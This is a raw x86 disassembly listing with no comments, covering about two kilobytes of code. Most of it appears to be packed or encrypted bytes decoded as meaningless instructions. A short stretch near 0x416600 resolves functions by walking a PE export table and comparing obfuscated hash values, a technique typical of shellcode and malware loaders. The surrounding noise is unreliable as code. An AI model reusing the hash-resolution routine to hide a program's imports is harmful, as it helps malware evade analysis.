  415ff3:	cmp    ebp,DWORD PTR [ebx]
  415ff5:	pop    ecx
  415ff6:	int3   
  415ff7:	call   0xad9d1380
  415ffc:	adc    DWORD PTR [ebp+edi*8-0x44600678],ebp
  416003:	push   ebx
  416004:	xlat   BYTE PTR ds:[bx]
  416006:	jae    0x416051
  416008:	mov    ch,0x88
  41600a:	repz xchg edx,eax
  41600c:	rcr    DWORD PTR cs:[ebx],0x91
  416010:	pop    esi
  416011:	ds pop ebp
  416014:	ret    
  416015:	push   0x6e765777
  41601a:	jl     0x41608f
  41601c:	pop    ds
  41601d:	clc    
  41601e:	dec    ebp
  41601f:	sbb    DWORD PTR [esp+eiz*8],ebp
  416022:	mul    DWORD PTR [esp+eax*1+0x2d]
  416026:	sub    DWORD PTR [edi-0x364c9ed1],ecx
  41602c:	cmp    esp,ebp
  41602e:	scas   eax,DWORD PTR es:[edi]
  41602f:	cmp    ebp,DWORD PTR [esi]
  416031:	cdq    
  416032:	sahf   
  416033:	push   cs
  416034:	sqrtps xmm1,xmm4
  416037:	clc    
  416038:	arpl   WORD PTR [ebp-0x3fc80807],sp
  41603e:	das    
  41603f:	das    
  416040:	sti    
  416041:	arpl   WORD PTR [ecx+0x3697ff0b],si
  416047:	loope  0x416010
  416049:	adc    eax,0x66da87e9
  41604e:	call   0x4eb2d450
  416053:	outs   dx,BYTE PTR ds:[esi]
  416054:	push   esi
  416055:	addr16 sbb al,0x17
  416058:	retf   
  416059:	out    dx,al
  41605a:	pop    ebx
  41605b:	inc    eax
  41605c:	push   esi
  41605d:	jbe    0x416056
  41605f:	xor    DWORD PTR [esi+0x751e16d1],eax
  416065:	jl     0x41605c
  416067:	inc    esp
  416068:	push   ebx
  416069:	xchg   dh,dl
  41606b:	fmul   DWORD PTR [edi]
  41606d:	mov    ebx,DWORD PTR [esi-0x77]
  416070:	mov    al,ds:0xa18db63c
  416075:	es pop edi
  416077:	out    dx,al
  416078:	cmp    edx,DWORD PTR [ebp+0x5c8b1599]
  41607e:	inc    edx
  41607f:	mov    esi,0xaf9efb38
  416084:	jmp    0x4160ac
  416086:	xor    ebx,DWORD PTR [edx+0x60]
  416089:	jl     0x416088
  41608b:	arpl   WORD PTR [ecx],dx
  41608d:	stc    
  41608e:	xor    ch,BYTE PTR [edx+0x3b]
  416091:	mov    ah,0x5a
  416093:	mov    ah,0xf4
  416095:	lock (bad) 
  416097:	fadd   QWORD PTR [eax+0x7c18aac2]
  41609d:	rol    BYTE PTR [edx-0x7d3bc18b],0xa1
  4160a4:	push   0x4a
  4160a6:	mov    al,ds:0x82434129
  4160ab:	test   BYTE PTR [edi+0x0],dh
  4160ae:	fld    TBYTE PTR [ecx]
  4160b0:	sbb    BYTE PTR [ecx-0x100ecded],0x81
  4160b7:	inc    edi
  4160b8:	scas   eax,DWORD PTR es:[edi]
  4160b9:	xchg   esp,eax
  4160ba:	in     al,dx
  4160bb:	push   ecx
  4160bc:	pop    eax
  4160bd:	(bad)  
  4160bf:	cmp    BYTE PTR [eax+0x529a8a75],bl
  4160c5:	or     DWORD PTR [ecx+eax*8],0x2fc1b78
  4160cc:	mov    BYTE PTR [eax-0x57ef1b5e],dl
  4160d2:	adc    BYTE PTR [edx],ah
  4160d4:	pop    ds
  4160d5:	imul   edx,DWORD PTR [ecx-0xe],0xffffff97
  4160d9:	stc    
  4160da:	out    dx,al
  4160db:	pop    ebx
  4160dc:	frstor [ebx+0x65d48efa]
  4160e2:	mov    ds:0x784b6530,al
  4160e7:	or     BYTE PTR [esp+eiz*8-0xa019668],0x33
  4160ef:	xlat   BYTE PTR ds:[ebx]
  4160f0:	in     al,0x4d
  4160f2:	stos   DWORD PTR es:[edi],eax
  4160f3:	mov    eax,0x7729f40
  4160f8:	sub    eax,0x48b56606
  4160fd:	fdivr  st,st(1)
  4160ff:	inc    esp
  416100:	stos   BYTE PTR es:[edi],al
  416101:	sub    al,BYTE PTR [ebx*4-0x2a785b95]
  416108:	ins    BYTE PTR es:[edi],dx
  416109:	lods   al,BYTE PTR ds:[esi]
  41610a:	add    bh,al
  41610c:	loopne 0x41618c
  41610e:	aaa    
  41610f:	jmp    0x511d3468
  416114:	mov    bl,BYTE PTR [esi-0x4dafdead]
  41611a:	imul   edx,DWORD PTR [eax+ebx*4-0x1e001e25],0xffffffff
  416122:	xor    eax,eax
  416124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416125:	idiv   BYTE PTR [ebx+edi*1]
  416128:	mov    ds:0xc81b5592,eax
  41612d:	mov    dl,0xd8
  41612f:	xchg   esi,ebx
  416131:	loopne 0x416196
  416133:	inc    edx
  416134:	pop    ss
  416135:	mov    ebp,0x12c61b72
  41613a:	addr16 mov cl,0x9d
  41613d:	fisub  DWORD PTR [esi]
  41613f:	inc    esp
  416140:	xchg   ebx,eax
  416141:	inc    esp
  416142:	add    dl,BYTE PTR [ecx-0x2d]
  416145:	pop    eax
  416146:	add    eax,0x529dd59d
  41614b:	cmp    al,0xb
  41614d:	mov    BYTE PTR [edi],ah
  41614f:	aaa    
  416150:	add    ch,dl
  416152:	fisub  WORD PTR [ebx-0x5e]
  416155:	fwait
  416156:	call   0x5958312a
  41615b:	sub    al,0x28
  41615d:	retf   0x1de6
  416160:	push   0xffffffbc
  416162:	int3   
  416163:	fldcw  WORD PTR [esi]
  416165:	cmp    al,0x82
  416167:	sahf   
  416168:	push   esi
  416169:	mov    BYTE PTR cs:[esi+ebp*1+0x2f9f7a6b],ch
  416171:	dec    BYTE PTR [ebx+eax*2-0x13]
  416175:	pop    ecx
  416176:	pop    esi
  416177:	or     ebx,esp
  416179:	sub    al,0x70
  41617b:	adc    al,0x8c
  41617d:	int3   
  41617e:	mov    ds:0xf440417d,al
  416183:	aam    0x97
  416185:	arpl   WORD PTR [eax-0x18],si
  416188:	push   ecx
  416189:	sub    esi,DWORD PTR [eax-0x4]
  41618c:	or     DWORD PTR [ecx+0xef028e6],edi
  416192:	cmp    dl,BYTE PTR [ebp-0x2b469130]
  416198:	adc    DWORD PTR [edi+0x4b93330d],0x3230d7b4
  4161a2:	xchg   edi,eax
  4161a3:	out    dx,eax
  4161a4:	or     dh,BYTE PTR [edx-0x3de7d315]
  4161aa:	fadd   DWORD PTR [ebp-0x45]
  4161ad:	imul   ebp,esp,0x19ae3ff
  4161b3:	sbb    eax,0xac9211ad
  4161b8:	pop    ebx
  4161b9:	sbb    eax,DWORD PTR [edi-0x5c5c7c30]
  4161bf:	jle    0x4161f5
  4161c1:	fwait
  4161c2:	ins    BYTE PTR es:[edi],dx
  4161c3:	add    esi,eax
  4161c5:	and    DWORD PTR [edx+0x15bd0b5c],eax
  4161cb:	or     al,0x56
  4161cd:	aas    
  4161ce:	mov    ebx,0x4520a616
  4161d3:	imul   esi,DWORD PTR [eax],0x32
  4161d6:	leave  
  4161d7:	sbb    ah,0x88
  4161da:	jl     0x4161bb
  4161dc:	pop    ebp
  4161dd:	jae    0x416254
  4161df:	or     bl,BYTE PTR [edi]
  4161e1:	adc    ebp,ecx
  4161e3:	and    eax,0x91f05409
  4161e8:	mov    esi,ecx
  4161ea:	adc    bl,BYTE PTR [esi]
  4161ec:	repz jle 0x4161ad
  4161ef:	push   eax
  4161f0:	and    al,0xa5
  4161f2:	mov    eax,0x1fefac7a
  4161f7:	mov    dl,0x9d
  4161f9:	pop    ecx
  4161fa:	jns    0x416254
  4161fc:	xlat   BYTE PTR ds:[ebx]
  4161fd:	mov    WORD PTR [edx],ss
  4161ff:	pop    esi
  416200:	cmc    
  416201:	jno    0x41626f
  416203:	(bad)  
  416204:	mov    ebx,0x33e5eca8
  416209:	sub    eax,0xcb36f0b8
  41620e:	xchg   BYTE PTR [edx-0x7edd9d50],bh
  416214:	in     al,0xf
  416216:	mov    edi,0x5491b5e9
  41621b:	and    eax,DWORD PTR ds:0x9fadadad
  416221:	mov    edx,0xbddae324
  416226:	pusha  
  416227:	dec    edi
  416228:	jp     0x4161be
  41622a:	add    DWORD PTR [ebx+0x6d],esp
  41622d:	dec    esi
  41622e:	jno    0x41625e
  416230:	shl    BYTE PTR [edx-0x16],0xc1
  416234:	sbb    bl,BYTE PTR [ebp-0x376e5500]
  41623a:	dec    edi
  41623b:	add    BYTE PTR [edx-0x10],ah
  41623e:	lods   eax,DWORD PTR ds:[esi]
  41623f:	and    al,0x4a
  416241:	out    0xea,eax
  416243:	inc    ebp
  416244:	mov    edx,0xa9358820
  416249:	xlat   BYTE PTR ds:[ebx]
  41624a:	cmp    al,0xdc
  41624c:	push   eax
  41624d:	pop    ebp
  41624e:	xor    eax,0x428d62f1
  416253:	and    bh,BYTE PTR [ebx]
  416255:	repz das 
  416257:	jo     0x4162b2
  416259:	retf   0x6d70
  41625c:	mov    dl,0x87
  41625e:	lds    ecx,FWORD PTR [edi+esi*8+0x51]
  416262:	(bad)  
  416263:	mov    ds:0xf600ccea,eax
  416268:	lock leave 
  41626a:	aam    0x88
  41626c:	jge    0x4162a2
  41626e:	addr16 popa 
  416270:	arpl   WORD PTR [ebp+0x2112e77c],sp
  416276:	sti    
  416277:	xchg   ecx,eax
  416278:	mov    bl,0xe0
  41627a:	jmp    DWORD PTR [edi]
  41627c:	lds    edx,FWORD PTR [edx]
  41627e:	mov    ebx,0xee3fd813
  416283:	mov    al,ds:0xa6f38ce8
  416288:	inc    esp
  416289:	sbb    eax,0x9eafd7e3
  41628e:	fbld   TBYTE PTR [edx+ebp*8]
  416291:	xchg   esi,eax
  416292:	neg    DWORD PTR [ebp+0x540daa2e]
  416298:	sti    
  416299:	mov    eax,ds:0x36b5d1b3
  41629e:	gs xchg ebx,eax
  4162a0:	enter  0x8a2f,0xc1
  4162a4:	scas   eax,DWORD PTR es:[edi]
  4162a5:	imul   eax,DWORD PTR [ecx-0x5db72d42],0x74
  4162ac:	hlt    
  4162ad:	cmp    esi,ebx
  4162af:	xchg   DWORD PTR [ebp+edi*1-0x7f64d1a4],edi
  4162b6:	mov    ch,BYTE PTR [edi+0x30846f49]
  4162bc:	retf   
  4162bd:	pop    ebp
  4162be:	xor    eax,0x8174cf17
  4162c3:	add    al,0x29
  4162c5:	jnp    0x4162d5
  4162c7:	xchg   ecx,eax
  4162c8:	and    ebx,edx
  4162ca:	add    BYTE PTR [edi+0x722d4a3b],ah
  4162d0:	mov    BYTE PTR [edx-0x43],bl
  4162d3:	cmp    al,0x43
  4162d5:	pushf  
  4162d6:	inc    eax
  4162d7:	std    
  4162d8:	out    dx,al
  4162d9:	shl    BYTE PTR [ebx-0x59502322],0x29
  4162e0:	retf   
  4162e1:	xor    dl,ah
  4162e3:	shr    ah,cl
  4162e5:	push   0xffffffe4
  4162e7:	push   ecx
  4162e8:	call   DWORD PTR [edi+0x348270bf]
  4162ee:	mov    esi,0xb9856904
  4162f3:	mov    ebx,0xde35eeb1
  4162f8:	test   BYTE PTR [edx+0x75],bh
  4162fb:	mov    bl,0x57
  4162fd:	jp     0x416299
  4162ff:	adc    DWORD PTR [edx],ecx
  416301:	xlat   BYTE PTR ds:[ebx]
  416302:	dec    ecx
  416303:	clc    
  416304:	or     ecx,edi
  416306:	jns    0x416317
  416308:	and    al,0x42
  41630a:	xchg   ecx,eax
  41630b:	bnd jmp 0x41629d
  41630e:	cmp    esp,esp
  416310:	cmc    
  416311:	and    eax,0x87b320c2
  416316:	jne    0x4162b4
  416318:	pushf  
  416319:	int3   
  41631a:	sbb    DWORD PTR [ebp+0x748def94],esp
  416320:	dec    eax
  416321:	fimul  WORD PTR [esi+0x63]
  416324:	mov    al,0x8c
  416326:	cs sub al,0xbd
  416329:	das    
  41632a:	pop    ebp
  41632b:	lods   eax,DWORD PTR ds:[esi]
  41632c:	stos   DWORD PTR es:[edi],eax
  41632d:	sbb    ch,BYTE PTR [esi-0x760c9d81]
  416333:	push   esi
  416334:	or     BYTE PTR [eax],dh
  416336:	hlt    
  416337:	and    ah,BYTE PTR [edi+0x38]
  41633a:	aaa    
  41633b:	cdq    
  41633c:	xchg   edi,eax
  41633d:	repnz in al,dx
  41633f:	and    al,0x60
  416341:	loop   0x41639d
  416343:	out    dx,eax
  416344:	and    DWORD PTR [edi],esp
  416346:	push   esp
  416347:	imul   edi,DWORD PTR [edi],0xffffffd2
  41634a:	adc    al,0xbe
  41634c:	sub    edi,ebx
  41634e:	or     al,0x6a
  416350:	jle    0x4162f2
  416352:	mov    edi,0xcbb61d8d
  416357:	aad    0x76
  416359:	aad    0xd6
  41635b:	repz mov bl,0x6
  41635e:	mov    cl,0x82
  416360:	push   ecx
  416361:	and    BYTE PTR [edx-0x357af9d],0x4d
  416368:	adc    al,0x7d
  41636a:	das    
  41636b:	xchg   ebp,eax
  41636c:	xor    al,0x9b
  41636f:	mov    esp,0x62df8235
  416374:	ss retf 0x3112
  416378:	pop    ds
  416379:	clc    
  41637a:	push   ds
  41637b:	jmp    0x7d22:0x1a5ff499
  416382:	push   0xcf1bc767
  416387:	mov    al,ds:0x69f88bb
  41638c:	xchg   esi,eax
  41638d:	test   al,0xc5
  41638f:	mov    cl,cl
  416391:	shl    BYTE PTR [esi],cl
  416393:	js     0x416321
  416395:	sub    edi,0xffffff81
  416398:	pop    ds
  416399:	mov    eax,gs:0xb259a488
  41639f:	adc    dh,BYTE PTR [edx+0x66]
  4163a2:	pop    ecx
  4163a3:	sub    ah,dh
  4163a5:	icebp  
  4163a6:	dec    edi
  4163a7:	xor    BYTE PTR [edi-0x348e82fd],ah
  4163ad:	dec    eax
  4163ae:	addr16 mov ds:0xadbc,al
  4163b2:	je     0x416372
  4163b4:	ret    0x55bc
  4163b7:	push   eax
  4163b8:	and    ch,dl
  4163ba:	xchg   ebx,eax
  4163bb:	adc    BYTE PTR [edi],ch
  4163bd:	jge    0x416343
  4163bf:	mov    ds:0xcc0d6b35,al
  4163c4:	outs   dx,BYTE PTR ds:[esi]
  4163c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163c6:	inc    eax
  4163c7:	lods   al,BYTE PTR ds:[esi]
  4163c8:	pop    esp
  4163c9:	mov    eax,ds:0x9fbef3c7
  4163ce:	push   esi
  4163cf:	retf   0x5bc2
  4163d2:	sbb    BYTE PTR [ebx-0x11],0x93
  4163d6:	imul   ebx
  4163d8:	sub    bh,BYTE PTR [ebx-0x21]
  4163db:	je     0x41637b
  4163dd:	mov    esi,ss
  4163df:	mov    edx,ecx
  4163e1:	adc    DWORD PTR [edi+0x4c],0xd36f9957
  4163e8:	into   
  4163e9:	mov    ds:0x27c43bdb,eax
  4163ee:	pusha  
  4163ef:	adc    al,0x44
  4163f1:	mov    ds:0xca646d2d,eax
  4163f6:	mov    ch,0x4
  4163f8:	mov    bl,0x8a
  4163fa:	xor    DWORD PTR ds:[ebp+0x36ec447a],0xffffff80
  416402:	fsubr  st(0),st
  416404:	push   0x75
  416406:	jl     0x416473
  416408:	push   ebx
  416409:	icebp  
  41640a:	outs   dx,BYTE PTR ds:[esi]
  41640b:	mov    dh,bl
  41640d:	and    al,BYTE PTR [edi-0x1e]
  416410:	sbb    eax,DWORD PTR [ebp-0x22]
  416413:	xor    BYTE PTR [eax+eiz*1],bh
  416416:	sbb    al,BYTE PTR [edi-0x1b947ce7]
  41641c:	fcom   st(0)
  41641e:	sub    eax,0xfd322d43
  416423:	cwde   
  416424:	jmp    0x441c:0x2f2d8bbe
  41642b:	mov    bl,0xcf
  41642d:	pop    ebp
  41642e:	adc    DWORD PTR [edi-0x4e099cb6],0x5d
  416435:	pop    ebx
  416436:	lea    edi,[ecx+0x9]
  416439:	jp     0x4163c1
  41643b:	in     eax,0x31
  41643d:	dec    edx
  41643e:	pop    ss
  41643f:	jg     0x4163cc
  416441:	or     DWORD PTR [edx-0x18],0x2e8aa60e
  416448:	in     eax,0x52
  41644a:	mov    ebp,0x14a474df
  41644f:	psadbw mm3,QWORD PTR [ebp+0x430ca1e8]
  416456:	fild   DWORD PTR [edi+0x3145318f]
  41645c:	inc    esi
  41645d:	imul   DWORD PTR [edx]
  41645f:	leave  
  416460:	iret   
  416461:	mov    cl,0xdf
  416463:	test   BYTE PTR [edi-0x4e],0x4d
  416467:	and    al,0x51
  416469:	neg    BYTE PTR ds:0xddeecd24
  41646f:	mov    bh,0x19
  416471:	outs   dx,BYTE PTR ds:[esi]
  416472:	(bad)  [ecx]
  416474:	cmc    
  416475:	mov    ds:0xecb4642f,al
  41647a:	pop    esp
  41647b:	jmp    0x9fd0:0xe5243a51
  416482:	pop    ds
  416483:	aas    
  416484:	jns    0x416502
  416486:	lds    edx,FWORD PTR [ebx+0x2d9eb500]
  41648c:	enter  0xe5df,0x86
  416490:	popf   
  416491:	pop    ebp
  416492:	cs cmp edi,0xffffff8a
  416496:	jbe    0x416500
  416498:	mov    dl,0xd3
  41649a:	ficomp DWORD PTR [edi+0x4344c280]
  4164a0:	in     al,dx
  4164a1:	jb     0x416471
  4164a3:	adc    al,0xe1
  4164a5:	push   0x25bcb6ca
  4164aa:	jg     0x4164a7
  4164ac:	ror    DWORD PTR [eax+ebp*1+0x7],1
  4164b0:	sbb    BYTE PTR [edi],cl
  4164b2:	hlt    
  4164b3:	pop    DWORD PTR [edx-0x58dc3af7]
  4164b9:	lods   al,BYTE PTR ds:[esi]
  4164ba:	lds    eax,FWORD PTR [ecx+ecx*4]
  4164bd:	jmp    0x52f4:0x144b6e68
  4164c4:	repnz leave 
  4164c6:	add    esi,DWORD PTR [esi]
  4164c8:	ret    
  4164c9:	lahf   
  4164ca:	jmp    0xc30a:0xc0f8f466
  4164d1:	das    
  4164d2:	jbe    0x416525
  4164d4:	xchg   esi,eax
  4164d5:	outs   dx,BYTE PTR ds:[esi]
  4164d6:	fistp  DWORD PTR [ebx+eiz*2-0x70]
  4164da:	or     eax,0x98d2cab6
  4164df:	cmp    DWORD PTR [eax+0x7477ab81],0xffffffd2
  4164e6:	push   ss
  4164e7:	xor    eax,0x54ce7e1
  4164ec:	mov    bl,0x6e
  4164ee:	jg     0x41650b
  4164f0:	sbb    BYTE PTR [ebp+0x24],dl
  4164f3:	lods   al,BYTE PTR ds:[esi]
  4164f4:	push   ebx
  4164f5:	popa   
  4164f6:	xor    dl,BYTE PTR [esi]
  4164f8:	dec    esp
  4164f9:	es jno 0x4164ca
  4164fc:	rol    BYTE PTR [ecx],cl
  4164fe:	ret    
  4164ff:	loopne 0x416502
  416501:	inc    ebx
  416502:	push   ds
  416503:	int    0x6a
  416505:	sbb    al,0xa9
  416507:	jne    0x4164b1
  416509:	in     al,0x60
  41650b:	and    DWORD PTR [ecx],ebx
  41650d:	nop    DWORD PTR [ecx+edi*2-0x72]
  416512:	push   cs
  416513:	xchg   BYTE PTR [edx-0x279241b5],bl
  416519:	js     0x4164a9
  41651b:	lods   al,BYTE PTR ds:[esi]
  41651c:	pop    es
  41651d:	test   DWORD PTR [ebp+0x0],0xeb684da4
  416524:	rcl    BYTE PTR ds:0xf3e6efb6,0x7f
  41652b:	mov    WORD PTR [esi],?
  41652d:	std    
  41652e:	popf   
  41652f:	sbb    cl,dh
  416531:	retf   
  416532:	and    eax,0x2e37915b
  416537:	xchg   ebx,eax
  416538:	jnp    0x4164ca
  41653a:	inc    edx
  41653b:	mov    ebp,0x780c4e4f
  416540:	(bad)  
  416541:	js     0x416543
  416543:	xchg   edi,eax
  416544:	shl    ebx,cl
  416546:	mov    ds:0xd0abe729,eax
  41654b:	int    0xe2
  41654d:	or     bh,bl
  41654f:	fsub   st(1),st
  416551:	cmp    bl,BYTE PTR [eax+0x13]
  416554:	mov    BYTE PTR [edx-0x7],ch
  416557:	repnz push es
  416559:	inc    edx
  41655a:	cmp    al,0x30
  41655c:	lods   al,BYTE PTR ds:[esi]
  41655d:	adc    ah,ah
  41655f:	rcl    dl,cl
  416561:	gs cmp al,0x37
  416564:	jl     0x4164fc
  416566:	cmp    ebp,ecx
  416568:	push   ebx
  416569:	cmp    eax,ebx
  41656b:	into   
  41656c:	out    dx,al
  41656d:	and    BYTE PTR [esi],cl
  41656f:	add    ebx,DWORD PTR [edx+edi*2+0x402cd9c]
  416576:	push   esp
  416577:	mov    ds:0x84f4045e,eax
  41657c:	repz jg 0x4165c0
  41657f:	mov    ebx,esp
  416581:	inc    ecx
  416582:	add    BYTE PTR [esi],cl
  416584:	imul   edi,edi,0x69
  416587:	out    dx,al
  416588:	push   ebx
  416589:	and    BYTE PTR [edi+0x29215352],al
  41658f:	out    dx,al
  416590:	setns  BYTE PTR [eax]
  416593:	mov    edx,0xed954432
  416598:	fcmovbe st,st(6)
  41659a:	xlat   BYTE PTR ds:[ebx]
  41659b:	pop    ecx
  41659c:	dec    edi
  41659d:	jmp    0xfd8e:0xfaea198b
  4165a4:	sbb    eax,0x370ef7f9
  4165a9:	jmp    0x8633:0xb1b64513
  4165b0:	outs   dx,BYTE PTR ds:[esi]
  4165b1:	clc    
  4165b2:	sub    BYTE PTR [ecx-0x5c],0x48
  4165b6:	add    eax,0x87ee2a2
  4165bb:	shl    BYTE PTR [ebp-0x60],1
  4165be:	popf   
  4165bf:	xchg   BYTE PTR [ebp-0x9],ah
  4165c2:	daa    
  4165c3:	xor    DWORD PTR [edi-0x40],esp
  4165c6:	cld    
  4165c7:	mov    eax,ds:0x36bfbb44
  4165cc:	(bad)  
  4165cd:	xor    al,0xba
  4165cf:	mov    ebp,0xbc8b39e1
  4165d4:	mov    dh,0xff
  4165d6:	shl    DWORD PTR [ebx-0x2c9b0b1f],cl
  4165dc:	mov    edx,DWORD PTR [ebx-0x7fb05caf]
  4165e2:	mov    ds:0xfeb9c185,eax
  4165e7:	mov    ah,0x94
  4165e9:	int3   
  4165ea:	cwde   
  4165eb:	nop
  4165ec:	fmul   DWORD PTR [esi]
  4165ee:	out    dx,al
  4165ef:	mov    ah,0xb3
  4165f1:	neg    DWORD PTR [eax]
  4165f3:	sbb    al,0x20
  4165f5:	or     ebx,DWORD PTR [esp+ebp*1-0x29]
  4165f9:	sti    
  4165fa:	jne    0x416622
  416600:	movsx  di,BYTE PTR [eax]
  416604:	mov    ebx,0x3b4b
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    al,BYTE PTR [edi+0x2c]
  416674:	push   ecx
  416675:	enter  0x23db,0x61
  416679:	(bad)  
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	hlt    
  41667f:	add    ebx,DWORD PTR [edi+edx*8-0x7bff0211]
  416686:	fwait
  416687:	dec    eax
  416688:	dec    edi
  416689:	sbb    BYTE PTR [ebp+0x37],0xf8
  41668d:	and    eax,DWORD PTR [ecx]
  41668f:	arpl   WORD PTR [ebx+0x34],sp
  416692:	mov    ds:0x926f2a9f,eax
  416697:	inc    esp
  416698:	and    BYTE PTR [edx+0x1dc44005],ch
  41669e:	test   BYTE PTR [ebx-0x2],dl
  4166a1:	fdivr  DWORD PTR [esi]
  4166a3:	out    dx,al
  4166a4:	pushf  
  4166a5:	push   esi
  4166a6:	popf   
  4166a7:	pcmpgtb mm3,mm4
  4166aa:	push   edi
  4166ab:	adc    DWORD PTR [ebp+0x49704f09],ebx
  4166b1:	push   ebx
  4166b2:	pop    edi
  4166b3:	dec    edi
  4166b4:	mov    ecx,edi
  4166b6:	div    DWORD PTR [ecx-0x9]
  4166b9:	add    bh,ah
  4166bb:	xchg   DWORD PTR [ebx],ecx
  4166bd:	pusha  
  4166be:	and    al,0x52
  4166c0:	pop    ebp
  4166c1:	imul   edx,DWORD PTR [edi],0x85aed633
  4166c7:	stos   BYTE PTR es:[edi],al
  4166c8:	pop    edi
  4166c9:	dec    ebp
  4166ca:	cdq    
  4166cb:	and    al,0x5b
  4166cd:	mov    WORD PTR [ebx+0x7a],gs
  4166d0:	mov    BYTE PTR [edx+ebp*4+0x401144ea],al
  4166d7:	add    al,0xad
  4166d9:	dec    edx
  4166da:	push   es
  4166db:	mov    dh,0x40
  4166dd:	mov    eax,0x3c7b29f5
  4166e2:	test   al,0x3d
  4166e4:	or     al,0x7e
  4166e6:	sti    
  4166e7:	push   ss
  4166e8:	mov    ds,WORD PTR [edi+0x1dace1b8]
  4166ee:	mov    edi,0x670a0f11
  4166f3:	hlt    
  4166f4:	shl    BYTE PTR [edi+0x2a],cl
  4166f7:	test   BYTE PTR [ebx+0x4827c34b],0x8c
  4166fe:	int    0x9d
  416700:	shl    DWORD PTR [ecx],0x1b
  416703:	shl    BYTE PTR [ebp+0x5b81a849],0xcc
  41670a:	hlt    
  41670b:	aam    0xc4
  41670d:	imul   edi,esp,0x48768987
  416713:	shl    dl,1
  416715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416716:	xor    BYTE PTR [eax+eiz*2],ch
  416719:	add    al,0x59
  41671b:	add    al,0x34
  41671d:	and    al,0xeb
  41671f:	sub    DWORD PTR [eax],ebx
  416721:	je     0x41673f
  416723:	xchg   esp,eax
  416724:	imul   ebx,DWORD PTR [ebx-0x3a],0x4e17672d
  41672b:	xor    ebx,DWORD PTR [ebx-0x1e7beeac]
  416731:	dec    edi
  416732:	mov    al,0x5d
  416734:	push   edx
  416735:	loopne 0x416799
  416737:	scas   eax,DWORD PTR es:[edi]
  416738:	add    al,0xb5
  41673a:	mov    edx,0x55311aaa
  41673f:	pop    edx
  416740:	or     ecx,esi
  416742:	sbb    edx,DWORD PTR [ebx-0x11]
  416745:	stc    
  416746:	dec    edx
  416747:	adc    al,0x57
  416749:	add    DWORD PTR [eax],ebp
  41674b:	fs jge 0x4167aa
  41674e:	cmp    al,0x27
  416750:	lahf   
  416751:	add    DWORD PTR [edi-0x7b23dda6],esp
  416757:	aas    
  416758:	sbb    eax,0xccfb35b9
  41675d:	pop    ebx
  41675e:	popf   
  41675f:	dec    ebx
  416760:	rol    BYTE PTR [edi],cl
  416762:	cmp    cl,BYTE PTR [edx+0x17]
  416765:	inc    eax
  416766:	push   esp
  416767:	retf   0xe755
  41676a:	xor    DWORD PTR [ecx+0x6],0x5f1295f3
  416771:	(bad)  
  416772:	push   ecx
  416773:	adc    eax,0x4b03d19b
  416778:	push   ebp
  416779:	js     0x41677e
  41677b:	call   0x7d29:0x541b01c6
  416782:	cmc    
  416783:	sti    
  416784:	jmp    0xc24f:0xef24e56a
  41678b:	(bad)  
  41678c:	pop    ss
  41678d:	mov    cl,0xff
  41678f:	cmp    al,0x42
  416791:	enter  0xee9e,0xe8
  416795:	xor    eax,0x1bc2f981
  41679a:	rcr    ebx,0x64
  41679d:	ss dec ecx
  41679f:	ins    BYTE PTR es:[edi],dx
  4167a0:	mov    cl,0xc1
  4167a2:	or     al,0x72
  4167a4:	loope  0x416734
  4167a6:	mov    edi,ecx
  4167a8:	jne    0x416773
  4167aa:	adc    eax,0x49cfef81
  4167af:	xor    bh,BYTE PTR [edx+0x13]
  4167b2:	(bad)  
  4167b4:	cmp    dl,bl
  4167b6:	jns    0x41681e
  4167b8:	jge    0x416800
  4167ba:	jnp    0x41681c
  4167bc:	out    0x43,eax
  4167be:	call   0x806a33fb
  4167c3:	imul   eax,ebp,0x3d
  4167c6:	jle    0x4167c0
  4167c8:	inc    ebx
  4167c9:	jb     0x416789
  4167cb:	dec    edx
  4167cc:	xor    al,0x92
  4167ce:	test   BYTE PTR [esi-0x30],al
  4167d1:	repz jmp 0xb208e8d5
  4167d7:	pusha  
  4167d8:	dec    ebx
  4167d9:	dec    ebx
  4167da:	inc    esi
  4167db:	xor    ebp,DWORD PTR [edi-0x76]
  4167de:	repz mov al,0x54
  4167e1:	xchg   ebx,eax
  4167e2:	scas   eax,DWORD PTR es:[edi]
  4167e3:	sbb    DWORD PTR [edi+ebp*2+0x1579129e],edx
  4167ea:	popa   
  4167eb:	mov    WORD PTR [eax-0x46],es
  4167ee:	(bad)  
  4167f0:	rcr    BYTE PTR [ebp+0x6d3838f5],1
  4167f6:	adc    cl,BYTE PTR [edx]
  4167f8:	mov    cs,WORD PTR [ebx+0x2]
  4167fb:	xor    edx,ebp
  4167fd:	push   ebx
  4167fe:	and    eax,0xad074187
  416803:	cmp    ah,BYTE PTR [ebp-0xb]
  416806:	sub    eax,0xb59de2f5
  41680b:	ja     0x41688a
  41680d:	ins    BYTE PTR es:[edi],dx
  41680e:	cli    
  41680f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416810:	bound  ebp,QWORD PTR [ebx-0x2a]
  416813:	fwait
  416814:	cmp    dl,BYTE PTR [edx-0x41]
  416817:	mov    WORD PTR [ecx+0x13],gs
  41681a:	inc    edx
  41681b:	jecxz  0x4167a0
